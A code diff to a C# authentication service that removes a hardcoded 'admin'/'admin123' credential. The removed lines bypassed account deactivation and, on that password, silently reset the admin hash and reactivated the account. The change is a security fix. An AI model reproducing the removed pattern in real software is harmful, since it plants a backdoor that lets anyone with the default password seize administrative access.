@@ -8,8 +8,6 @@ namespace Open_lab.Services
 {
     public class AuthService : IAuthService
     {
-        private const string AdminUsername = "admin";
-        private const string AdminDevelopmentPassword = "admin123";
         private readonly OpenLabDbContext _db;
 
         public AuthService(OpenLabDbContext db)
@@ -25,7 +23,7 @@ namespace Open_lab.Services
                 return null;
             }
 
-            if (!user.IsActive && !string.Equals(user.Username, AdminUsername, StringComparison.OrdinalIgnoreCase))
+            if (!user.IsActive)
             {
                 return null;
             }
@@ -48,18 +46,6 @@ namespace Open_lab.Services
 
             if (PasswordSecurity.Verify(password, user.Salt, user.PasswordHash))
             {
-                return user;
-            }
-
-            // Preserve development access: admin/admin123 must always remain valid.
-            if (string.Equals(user.Username, AdminUsername, StringComparison.OrdinalIgnoreCase) &&
-                string.Equals(password, AdminDevelopmentPassword, StringComparison.Ordinal))
-            {
-                var resetSalt = PasswordSecurity.GenerateSalt();
-                user.Salt = resetSalt;
-                user.PasswordHash = PasswordSecurity.ComputeSha256(AdminDevelopmentPassword, resetSalt);
-                user.IsActive = true;
-                await _db.SaveChangesAsync();
                 return user;
             }
 
